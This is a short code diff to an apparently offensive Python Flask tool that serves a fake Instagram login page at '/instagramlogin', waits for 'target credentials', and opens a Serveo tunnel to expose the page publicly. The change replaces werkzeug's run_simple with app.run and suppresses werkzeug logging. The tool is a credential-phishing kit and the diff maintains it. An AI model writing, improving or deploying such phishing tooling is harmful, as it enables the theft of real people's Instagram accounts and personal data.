@@ -6,7 +6,6 @@ import subprocess
 from termcolor import colored
 from pyfiglet import figlet_format
 from flask import Flask, request, render_template
-from werkzeug.serving import run_simple
 
 app = Flask(__name__)
 log_dir = 'Log'
@@ -56,7 +55,13 @@ def start_server(port):
     url = f'http://127.0.0.1:{port}/instagramlogin'
     print(colored(f"[+] Target URL --> {url}", 'yellow', attrs=['bold']))
     print(colored("[+] Waiting for target credentials...", 'green', attrs=['bold']))
-    run_simple('0.0.0.0', port, app, use_reloader=False, use_debugger=False)
+
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
+    logging.getLogger('werkzeug').setLevel(logging.ERROR)
+
+    app.run(host='0.0.0.0', port=port)
 
 def start_serveo_tunnel(port):
     print(colored("[!] Starting Serveo tunnel...", 'yellow', attrs=['bold']))
